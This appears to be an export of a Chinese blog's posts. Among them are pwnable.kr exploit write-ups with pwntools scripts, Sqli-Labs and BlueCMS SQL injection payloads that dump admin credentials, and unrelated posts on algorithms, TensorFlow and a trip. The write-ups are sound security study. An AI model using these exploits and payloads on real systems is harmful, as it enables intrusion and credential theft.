      <content type="text"><![CDATA[简单GOT覆写 passcodemain先file看一下，32位。 用IDA打开，f5 可以看到，在调用完 welcome() 后立即调用了 login()。也就是说，welcome()栈帧的栈底 和 login()栈帧的栈底 是一样的。 welcome（） 通过 __isoc99_scanf() 读取name字符串，字符串大小为100。且由1int v1; // [sp+18h] [bp-10h]@0 这一行可知，在 welcome() 的栈帧中，name字符串的起始位置在 ebp-70h 的地方。 login（） 这里分别通过1__isoc99_scanf(&quot;%d&quot;) 来获得 passcode1 和 passcode2 的值。要注意的是，这里 scanf(“%d”) 中没有出现取地址符，也就是说，scanf(“%d”) 会直接把栈上的数据当作指针，并将读入的数据存放到这个“指针”指的“地址”上。 以第一个红框为例，它对应着 passcode1 的读入。scanf的参数有两个，第一个是格式化字符串，第二个是地址表列。按照参数从右到左入栈。所以下面这段话，将 ebp-0x10 处的数据 放到了 esp+0x4 处 作为了 scanf的地址表项参数12804857c: 8b 55 f0 mov edx,DWORD PTR [ebp-0x10]804857f: 89 54 24 04 mov DWORD PTR [esp+0x4],edx scanf的第一个参数即 格式化字符串 由下面这两句话传入1238048577: b8 83 87 04 08 mov eax,0x8048783省略8048583: 89 04 24 mov DWORD PTR [esp],eax 0x8048783 处的数据如下：所以对于第一个 scanf(), 它的第二个参数的数值为在login（）栈帧的 ebp-0x10 处的数据。 对于passcode2 的分析同理。 CheckAnalysis从login（）的逻辑来看，只要 v1 = 0x528E6 和 0xCC07C9 程序就能执行到 return system（）。而且 welcome（）和 login（） 的 ebp 是相同的，有没有可能通过构造 welcome的输入 来控制 v1 v2 的值呢？ 从前边的ida分析来看，在login（）的栈帧中，passcode1位置在 ebp-10h, 在welcome（）栈帧中，name字符串起始位置在 ebp-70h。由于welcome（）和login（）调用连续，他们的栈帧的ebp其实是一样的。如下图，两个栈帧对比如下： 70h - 10h = 60h = 96 &lt; 100。也就是说，我们在welcome（）中输入的name的第 97 - 100 的字符，在 login（）栈帧中恰好是作为第一个 scanf 的第二个参数（即地址表项）。而在login（）中，调用第一次 scanf 时传入的 %d 将会写到这个地址中。这样我们能控制 passcode1。 用peda的checksec检查发现开启了canary保护 由于passcode1已经是在长度为100的name的最后四个字节，因此不可能通过继续增加name的输入来控制 passcode2，否则会触发canary。 科普：GOTlinux中，ELF编译系统采用了一种叫延迟绑定（lazy binding）的技术。若ELF文件调用了定义在共享库中的函数，那ELF文件中就存在 GOT（全局偏移表） 和 PLT（过程链接表），其中GOT存放在 .data 段（已初始化的全局C变量），而PLT存放在 .text 段（已编译程序的机器代码）。对于一般函数，PLT表和GOT表一一对应。 当第一次调用共享库中的函数时，该函数对应的GOT表项中存放的是对应PLT表中的push1条目的地址。程序调用时，执行函数对应PLT的第一条指令时会先通过对应GOT跳转到PLT表中的下一条指令，之后通过一系列操作，将对应GOT覆盖为函数的真实地址，并执行该函数。等到下一次调用该函数时，程序一样先执行函数对应PLT的第一条指令，之后通过GOT表会直接执行该函数，因为GOT表中已经是函数的真实地址了。 Thinking通过之前的分析，我们能通过控制name的最后四个字节，结合passcode1的scanf来实现对任意地址的写入。加上 GOT表是在 .data 段，是可写的。因此一个想法就是：我们可以将 printf 的GOT表 覆写为 system函数的地址。由前可知，当再次调用 printf 时，会通过 printf的GOT表执行 system函数。 printf 的 GOT地址可以通过 pwntools 工具获得。也可以通过 objdump 获得，如下. 对于system函数地址，由于程序中已经提供了，所以这里直接取 80485e3 这里对应着login（）中的1return system(&quot;/bin/cat flag&quot;); 梳理一下思路：按照程序的流程，welcome（），我们输入100个字符，其中最后四个是 printf的GOT地址。之后程序进入login，调用scanf（”%d”）时，以 %d 形式将我们输入的数据（ system(“/bin/cat flag”)）读入，并写入到 printf的GOT地址。接下去，程序会执行 printf(“enter passcode2 : “); 即再次调用printf函数，但实际执行的是 system函数。要注意的是，由于是以 %d 形式读入，所以输入时应为 134514147 （0x80485e3 = 134514147） Exp12345678910111213141516171819from pwn import *elf = ELF("passcode")r = remote("127.0.0.1","12345")#r = process("./passcode")printfGotAddr = elf.got["printf"]systemAddr = 134514147print "the printfGotAddr is "+ hex(printfGotAddr)print "the systemAddr is "+ hex(systemAddr)payload1 = 'a' * 96 + p32(printfGotAddr)payload2 = str(systemAddr)r.sendline(payload1)r.sendline(payload2)print r.recv() flaglocal test123456789101112(venv) chybeta@ubuntu:~/pwn/pwnable/passcode$ python exp.py[*] &apos;/home/chybeta/pwn/pwnable/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE[+] Opening connection to 127.0.0.1 on port 12345: Donethe printfGotAddr is 0x804a000the systemAddr is 0x80485e3flag&#123;2222222222&#125;[*] Closed connection to 127.0.0.1 port 12345 pwnable.kr1234567891011121314151617181920212223242526272829passcode@ubuntu:~$ lsflag passcode passcode.cpasscode@ubuntu:~$ pythonPython 2.7.12 (default, Jul 1 2016, 15:12:24)[GCC 5.4.0 20160609] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; e = ELF(&quot;passcode&quot;)[*] &apos;/home/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE&gt;&gt;&gt; r = process(&quot;./passcode&quot;)[x] Starting local process &apos;./passcode&apos;[+] Starting local process &apos;./passcode&apos;: Done&gt;&gt;&gt; printfGotAddr = e.got[&quot;printf&quot;]&gt;&gt;&gt; systemAddr = 134514147&gt;&gt;&gt; payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)&gt;&gt;&gt; payload2 = str(systemAddr)&gt;&gt;&gt; r.sendline(payload1)&gt;&gt;&gt; r.sendline(payload2)&gt;&gt;&gt; print r.recv()[*] Process &apos;./passcode&apos; stopped with exit code 0Toddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :) FLAG: Sorry mom.. I got confused about scanf usage :(]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:bof]]></title>
      <url>%2F2017%2F04%2F07%2FPwnable-kr-bof%2F</url>
      <content type="text"><![CDATA[简单栈溢出。 bof原题有提供binary和source code。 12(venv) chybeta@ubuntu:~/pwn/pwnable/bof$ file bofbof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped 用IDA打开，f5: main函数： func函数： func函数接受一个参数（0xDEADBEEF），之后通过gets（）接受输入。因此可以通过栈溢出，将a1覆盖为0xCAFEBABE，这样能直接执行 system(“/bin/sh”) a1 是 func（）的参数，在栈上位于 ebp+8h 的位置。而输入字符串的起点为 ebp-2ch。两者相差：0x2c + 0x8h = 52 。 exp123456from pwn import *p = remote("pwnable.kr","9000")payload = 'a' * 52payload += p32(0xcafebabe)p.sendline(payload)p.interactive() flag]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[《The Pracetice of Programming》读书笔记（1）]]></title>
      <url>%2F2017%2F04%2F06%2F%E3%80%8AThe-Pracetice-of-Programming%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%2F</url>
      <content type="text"><![CDATA[《The Pracetice of Programming》读书笔记 Style Usually,the real code is mostly well down,but with something that could be improved. There is more to writing a program than getting the syntax right, fixing the bugs, and making it run fast enough. The principles of programming style are based on common sense guided by experience. Names labels an object and conveys information about its purpose. informative、concise、memorable, and pronounceable if possible the border the scope,the more information conveyed. suggestion 1use descriptive name for globals,short names for locals.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用python为1000php生成目录页面]]></title>
      <url>%2F2017%2F04%2F03%2F%E5%88%A9%E7%94%A8python%E4%B8%BA1000php%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E9%A1%B5%E9%9D%A2%2F</url>
      <content type="text"><![CDATA[1000php是指1000个PHP代码审计案例，来自2016.7以前乌云公开漏洞。github地址： https://github.com/Xyntax/1000phpgit clone下来后，案例保存在bugs文件夹里，名称都是wooyun-xxx-xxxxx格式，没有索引，从名字上看也难以知道这是什么类型的漏洞。所以这里为它生成一个目录页面。 Something漏洞的简要信息保存在页面的title标签中，如下使用BeautifulSoup来对wooyun-xxx-xxxxx.html进行解析，获取其title。如下： Code1234567891011121314151617181920import sysimport osfrom bs4 import BeautifulSoupreload(sys)sys.setdefaultencoding('utf8')htmlName = os.listdir(htmlLoc)indexhtml = open("index.html","w")setCharset = '&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;/head&gt;'indexhtml.write(setCharset)for i in htmlName: if i[0] == 'w': soup = BeautifulSoup(open(i),"html.parser") url ='&lt;a href="'+i+'"&gt;'+soup.title.string+'&lt;/a&gt;' indexhtml.write(url) indexhtml.write("&lt;/br&gt;")print "done!" Result将代码保存为py文件后，放在bugs文件夹下运行，会生成index.html文件。打开。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less1-4-writeup]]></title>
      <url>%2F2017%2F04%2F02%2FSqli-Labs-Less1-4-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less 1题目是 GET Error based- Single quotes -String。关注点：基于错误，单引号，字符型注入。 payload11http://localhost:20000/sqllab/Less-1/?id=1&apos; 此时页面会产生报错。 payload21http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,2,3 --+ 通过UNION SELECT 或者 ORDER BY 语句可以发现字段数为 3 ，可显示位置为 2,3。尾部—+会被浏览器解释为— （空格），这在mysql里是注释。 payload3获取数据库名称1http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3 FROM INFORMATION_SCHEMA.SCHEMATA --+ 利用元数据表INFORMATION_SCHEMA获取数据库信息。 获取表名12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x7365637572697479 --+ 这里 hex(security)=0x7365637572697479 获取字段名12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 0x7573657273 --+ 获取数据12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 2题目说是数值型注入。 不需要闭合引号。给出最终payload12http://localhost:20000/sqllab/Less-2/?id=0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 3题目提示 SINGLE QUOTES WITH TWIST。 payload11http://localhost:20000/sqllab/Less-3/?id=1&apos; 注意到报错回显中有 )，说明需要闭合。 payload2类似将Less1中的几段payload的前面的 0’ 改为 0’) 即可 最终payload12http://localhost:20000/sqllab/Less-3/?id=0&apos;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 4这题需要闭合双引号。 payload11http://localhost:20000/sqllab/Less-4/?id=0&quot; 需要闭合 双引号 payload2类似将Less1中的几段payload的前面的 0’ 改为 0”) 即可 最终payload12http://localhost:20000/sqllab/Less-3/?id=0&apos;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ sqlilab环境搭建下载sqlilab传送门：https://github.com/Audi-1/sqli-labs可以选择下载zip后解压或者自行git clone到本地， 推荐phpstudy传送门：http://www.phpstudy.net/a.php/211.html不懂使用的建议查一查。这里假设phpstudyd 主页为 http://localhost:20000/ 安装将sqlilab解压出来的文件夹（默认名为 sqli-labs-master）拷贝到phpstudy的WWW目录下，打开phpstudy，访问sqlilab页面( http://localhost:20000/sqli-labs-master )。点选Setup/reset Database for labs完成数据库配置。之后即可开始实验。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win下tensorflow安装避坑指南]]></title>
      <url>%2F2017%2F03%2F15%2Fwin%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0%2F</url>
      <content type="text"><![CDATA[好多同学来问怎么安装tensorflow，想想还是写一下吧。 建议 可以选择使用 virtualenv 来进行python环境的管理,这样不会混乱。 担心包与包之间的依赖问题的话，推荐直接使用 anaconda科学计算发行包。具体安装过程可参见：数据挖掘比赛（0）环境搭建之anaconda安装 原生python安装想想还是把这部分加进来了：） 避坑一：官网下载下载页面：https://www.python.org/downloads/windows/tensorflow官网上面说:tensorflow暂时只支持64bit的python3.5。所以不想折腾的同学不要去下载latest的python3.6，也不要去下python2.7，毕竟py3是未来啊。。 executable installer是把安装文件下载下来后再安装。 避坑二：安装python不想后面麻烦的话，安装时记得把 添加进系统路径 选上其余的选项不用担心，你可以自己选择安装路径，这里我直接选 Install Now了。 避坑三：试试打开cmd，输入python，应该会进入python交互式环境。如果提示不是内部或外部命令啥的，说明你的系统环境变量配置有问题。可以自己再手动添加进去，这里不提。 另外说一下，这里默认的python命令对应的版本为python3.5。 安装tensorflow避坑四：安装命令python3.5自带的pip3包管理器，我可以直接使用它来下载。1pip3 install --upgrade tensorflow 它会自动下载tensorflow及其它一些最新的依赖包。记得加上 —upgrade，不然安装的比如protobuf的版本可能相对较低后续可能会报错。然后会自动进行安装。直至如下： 避坑五：安装系统依赖包初次安装，可能会在导入的时候出错，这是因为win系统的动态链接库MSVCP140.DLL缺失的原因.有些同学在这一步没有出错，我猜你们写C语言用的是VS2015啥的hh。如下图，这里只截取部分。 去微软官网下载 Visual C++ 2015 redistributable，它包含了MSVCP140.DLL。 传送门：Visual C++ 2015 redistributable 一定要注意的是，要选择 x64 版本，对应你的64位操作系统然后安装。 测试在经过前面的步骤后，此时导入tensorflow应该没问题了。!()[http://ojp0pjljj.bkt.clouddn.com/tensor7.jpg]接下来就简单的测试一下，依次输入1234import tensorflow as tfhello = tf.constant('Hello, TensorFlow!')sess = tf.Session()print(sess.run(hello)) 好吧，好像没报错，不过一大堆的消息打印出来，心理总是有点不舒服：） 这边是关于这个问题的两个讨论，两个问题的讨论时间是在今年的2月份。 stackoverflow：unknow op github Issues: unknow op 他们所提出的“解决方法”是安装指定的这个nightly build版本，这个可以确实可以解决掉unknow op的警告问题，不过会产生另外的SSE警告。 关于python3.6有些同学可能一不小心安了python3.6，加上(anaconda官网)[https://www.continuum.io/downloads/]上的版本也已经更新为python3.6了。所以这边提供一个tensorflow-py3.6的安装包。 传送门： Python Extension Packages:tensorflow 至于能不能用，仁者见仁智者见智…… tensorflow GPU计算过程这里不展开，要装 vs+cuda+tensorflow,如果想更快的话，可以添加cudnn库。同时要求显卡是英伟达的且nvidia compute capability要大于3。此处略过不提。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[代码审计之SQL注入：BlueCMSv1.6 sp1]]></title>
      <url>%2F2017%2F03%2F14%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1%2F</url>
      <content type="text"><![CDATA[代码审计学习 工具及环境 bluecms v2.1 sp1链接：http://pan.baidu.com/s/1dFKLanR 密码：8v1c seay审计系统链接：http://pan.baidu.com/s/1dENS4KT 密码：rszt 环境PHP: 5.4.45MYSQL: 5.5.53 注入一审计用seay审计系统审计一下,定位到/ad_js.php。 该条语句为1$ad = $db-&gt;getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); getone()是自定义的函数，用来查询数据库，代码如下：12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; 回到ad_js.php1"SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id 可见这里的变量 $ad_id 没有单引号保护。接下来看看这个变量的来源。 1$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; 若通过GET获得ad_id则去除它两边的空白字符，否则为空。在获得了ad_id值后，接下来就直接将$ad_id送入了查询语句，没有做任何过滤，因此这里存在注入。 利用 先查询列数 /ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6 报错 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,7,8 报错 ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,7 无报错，且查看源代码发现数字7有回显。 提取数据利用元数据表爆出表名1ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database() 爆出字段 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e 获取用户名密码 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin 注入二审计函数定位：12345678910111213141516171819202122232425262728function getip()&#123; if (getenv('HTTP_CLIENT_IP')) &#123; $ip = getenv('HTTP_CLIENT_IP'); &#125; elseif (getenv('HTTP_X_FORWARDED_FOR')) &#123; //????????????????????????????ip ??? $ip = getenv('HTTP_X_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_X_FORWARDED')) &#123; $ip = getenv('HTTP_X_FORWARDED'); &#125; elseif (getenv('HTTP_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_FORWARDED')) &#123; $ip = getenv('HTTP_FORWARDED'); &#125; else &#123; $ip = $_SERVER['REMOTE_ADDR']; &#125; return $ip;&#125; 直接获取了ip，并没有验证IP格式，因此我们可以伪造ip。查看一下有哪些位置调用了 getip() ， comment.php页面其中有如下代码 $sql = &quot;INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;&quot;.getip().&quot;&#39;, &#39;$is_check&#39;)&quot;; $db-&gt;query($sql); 可以看到，这里执行了INSERT语句，且调用了getip()，这里存在注入。 利用这是目前的留言板： 在burp截包后，post参数如下：所以 user_id=2 id=6 即 post_id=6 对应发表留言的文章id type=1 mood=6 （这个无关紧要） 为了能让把管理员账号和密码回显出来，我们不能直接在getip()的位置上直接去查询。在前面的sql语句中，content变量是会回显到页面上的，这里利用这个位置去构造payload。 payload如下： 1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1 payload分析：1’,’1’)是为了完成第一次插入，之后的（）是为了完成第二次插入，前面的 ‘’,’6’,’2’,’1’,’6’ 是与第一个插入语句的参数相对应。接下来，我们把查询到的账号密码放在了第六个参数即content位置，这样能实现回显。而最后的 ‘1’,’1 是要满足列数相等否则会出错，同时要注意闭合原本语句中的单引号，其中第一个 1 对应sql语句中的$timestamp，表示发表时间，这个无关紧要。 所以这样插入后完整的sql语句是： $sql = INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1&#39;, &#39;$is_check&#39;)&quot;; Forward后 注入成功。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ACMXMU-OJ:1005]]></title>
      <url>%2F2017%2F03%2F09%2FACMXMU-OJ-1005%2F</url>
      <content type="text"><![CDATA[题目 1005.Complete PermutationDescriptionGenerate the complete permutation of 1..N InputEach input file contains only one non-negative integer N (0&lt; N &lt; 9) OutputOutput N! Lines, according to lexicographic order. Sample Input3 Sample Output1 2 3 1 3 2 2 1 3 2 3 1 3 1 2 3 2 1 想法一开始想到用递归来写全排列，就课本上的方法，结果才发现输出时最后两个的次序不对。先试了试STL中的next_permutation函数，后面又自己写了个字典序法全排列。这里简述一下字典序法全排列 待排列“字符串”： P_0P_1P_2..P_{j-1}P_jP_{j+1}..P_n 从后往前搜索，直到找到这样的一个数，它的下标为 j，且满足 P_{j} < P_{j+1}。此时有：P_{j} < P_{j+1} > P_{j+2} > P_{j+3} > .... > P_{n}即从P{j+1} 到 P{n}，它们是按字典序递减的。 再次从后向前搜索，直到找到这样的一个数，它的下标为 k，且满足 P_{k} > P_{j}。P_k的位置如下：P_0P_1P_2..P_{j-1}P_jP_{j+1}....P_{k-1}P_{k}P_{k+1}....P_n 交换P_{k}和P_{j}的值，这时候“字符串”为：P_0P_1P_2..P_{j-1}P_kP_{j+1}....P_{k-1}P_{j}P_{k+1}....P_n这时候得到的“字符串”会比原本的“字符串”大,但并不是所有大于“原字符串”中最小的。 结合由（2）得到的大小关系,以及 P_{k} > P_{j}，可以得到交换后的“字符串”大小关系如下:....P_kP_{j+2}>....>P_{k-1}>P_{j}>P_{k+1}....>P_n所以在最后一步中，把 P{j+1}P{j+2}….P_{n} 反转过来。最后得到：P_0P_1P_2..P_{j-1}P_kP_{n}..P_{j}..P_{j+1}P_{j+2}P_{j+1}....P_n这样得到的新“字符串”是大于“原字符串”中最小的。 提交字典序法全排列先贴代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int arrays[10];int main()&#123; int number; int q; scanf("%d",&amp;number); for(q = 1;q &lt;= number;q++) arrays[q] = q; while(true)&#123; int j,k; int q; for(q = 1;q &lt; number;q++) printf("%d ",arrays[q]); printf("%d\n",arrays[number]); for(j = number;j &gt; 0;j--) if(arrays[j] &lt; arrays[j+1]) break; if(j == 0) break; for(k = number;k &gt; j;k--) if(arrays[k] &gt; arrays[j]) break; int temp; temp = arrays[j]; arrays[j] = arrays[k]; arrays[k] = temp; int i1,i2; for(i1 = j+1,i2 = number;i1 &lt; i2;i1++,i2--) &#123; int temp; temp = arrays[i1]; arrays[i1] = arrays[i2]; arrays[i2] = temp; &#125; &#125; return 0;&#125; 使用STL123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;using namespace std;int main()&#123; int number; scanf("%d",&amp;number); int a[11]; int i; for(i = 0;i &lt; number;i++) a[i] = i + 1; do&#123; int k; for(k = 0;k &lt; number - 1;k++) printf("%d ",a[k]); printf("%d\n",a[number - 1]); &#125; while (next_permutation(a,a+number)); return 0;&#125; 递归全排列，不合要求123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int number;char arrays[11]="0123456789";void Perm(int m);int main()&#123; scanf("%d",&amp;number); int i,j; Perm(1); return 0;&#125;void Perm(int m)&#123; if (m == number)&#123; int i; for(i = 1;i &lt; m;i++) printf("%c ",arrays[i]); printf("%c\n",arrays[m]); &#125; else &#123; int i,j; for(j = m;j &lt;= number;j++)&#123; int temp; temp = arrays[j]; arrays[j] = arrays[m]; arrays[m] = temp; Perm(m+1); temp = arrays[j]; arrays[j] = arrays[m]; arrays[m] = temp; &#125; &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(3)数组单调和]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C%2F</url>
      <content type="text"><![CDATA[题目现定义数组单调和为所有元素i的f(i)值之和。这里的f(i)函数定义为元素i左边(不包括其自身)小于等于它的数字之和。请设计一个高效算法，计算数组的单调和。给定一个数组A同时给定数组的大小n，请返回数组的单调和。保证数组大小小于等于500，同时保证单调和不会超过int范围。 测试样例：[1,3,5,2,4,6],6返回：27 解法12345678910111213class MonoSum &#123;public: int calcMonoSum(vector&lt;int&gt; A, int n) &#123; int sum = 0; int i,j; for (j = 1;j &lt; n;j++)&#123; for (i = 0;i &lt; j;i++)&#123; sum += A[i]&lt;=A[j]?A[i]:0; &#125; &#125; return sum; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(2)棋子翻转]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC%2F</url>
      <content type="text"><![CDATA[题目在4x4的棋盘上摆满了黑白棋子，黑白两色的位置和数目随机其中左上角坐标为(1,1),右下角坐标为(4,4),现在依次有一些翻转操作，要对一些给定支点坐标为中心的上下左右四个棋子的颜色进行翻转，请计算出翻转后的棋盘颜色。给定两个数组A和f,分别为初始棋盘和翻转位置。其中翻转位置共有3个。请返回翻转后的棋盘。 测试样例：[[0,0,1,1],[1,0,1,0],[0,1,1,0],[0,0,1,0]],[[2,2],[3,3],[4,4]]返回：[[0,1,1,1],[0,0,1,0],[0,1,1,0],[0,0,1,0]] 解法123456789101112131415161718192021222324class Flip &#123;public: vector&lt;vector&lt;int&gt; &gt; flipChess(vector&lt;vector&lt;int&gt; &gt; A, vector&lt;vector&lt;int&gt; &gt; f) &#123; int numOfRotate = 3; int temp; int i,j; for (temp = 0;temp &lt; numOfRotate;temp++)&#123; int x = f[temp][0] - 1; int y = f[temp][1] - 1; if ((y - 1) &gt;= 0) A[x][y - 1]++; if ((y + 1) &lt;= 3) A[x][y + 1]++; if ((x - 1) &gt;= 0) A[x - 1][y]++; if ((x + 1) &lt;= 3) A[x+1][y]++; &#125; for (i = 0;i &lt; 4;i++) for (j = 0;j &lt; 4;j++) A[i][j] = A[i][j]%2; return A; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(1)最大差值]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC%2F</url>
      <content type="text"><![CDATA[题目有一个长为n的数组A，求满足0≤a≤b&lt;n的A[b]-A[a]的最大值。给定数组A及它的大小n，请返回最大差值。 测试样例：[10,5],2返回：0 法一1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i,j; for (i = 0; i &lt; n ; i++) for (j = i+1 ; j &lt; n ; j++)&#123; if (A[j] - A[i] &gt; dis) dis = A[j] - A[i]; &#125; return dis; &#125;&#125;; 法二1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i; for (i = 0; i &lt; n ; i++)&#123; if (A[i] &lt; min) min = A[i]; if ((A[i] - min) &gt; dis) dis = A[i]-min; &#125; return dis; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[记2017年阿里巴巴之行]]></title>
      <url>%2F2017%2F02%2F17%2F%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C%2F</url>
      <content type="text"><![CDATA[&emsp;&emsp;今年1月份，接到一个任务，负责组建厦门大学的互联网安全志愿者联盟队伍，我暂居队长之位。从大体上来讲，该志愿联盟偏向于业务性，而非技术性，这与我之前所接触的网络安全方向有所不同。而在今年2月15日，作为队长，受联盟邀请前往阿里巴巴参与青年领导力培训会。以下就“记流水账”地回忆一下这几天来的经历吧。 前奏&emsp;&emsp;在前往阿里巴巴之前，我被任命为HR，负责管理此次参加阿里巴巴培训会的各高校同学的信息和安全。虽然被选为组委会的同学们（大部分）都还互不相识，但在工作时配合度和效率还是非常高的。而且也很感谢慈玉姐的信任，不然以我互联网安全联盟资历之浅何以担此之任？ 2 月 15 日 晚&emsp;&emsp;我选择火车，从厦门北出发，一路颠簸。由于作为HR，需要及时的跟进各位人员的行程信息，但手机信号时好时坏，所以在沟通上也时断时续hh。&emsp;&emsp;等到了杭州，已经是下午的五点左右。三年前，曾和两知己来杭州浙大进行物竞培训，而今三人中一人去了北大一人去了浙大，不禁感慨。 &emsp;&emsp;尽管早早地坐上出租车，不过在16公里的路程中遇到了16个红灯，等到达酒店已是六点多，等收拾完毕，欧总PM招呼我和他们吃饭。在吃饭的过程中和其他联盟队伍的同学进行交谈，向欧总PM，赵zy学长，马l学姐等讨教一些关于建队和发展的事项。 &emsp;&emsp;晚上8点左右，慈玉姐给各位参会同学开个简短的小会，并在之后与组委会成员讨论进一步的后续安排。并且单独与慈玉姐探讨了本校联盟的发展方向和具体事项，并且我向慈玉姐询问了关于阿里巴巴校园俱乐部的事。俱乐部的事跟安全联盟没有关系，不过慈玉姐要帮我向其余部门的同事询问询问，太感谢了！ 2 月 16 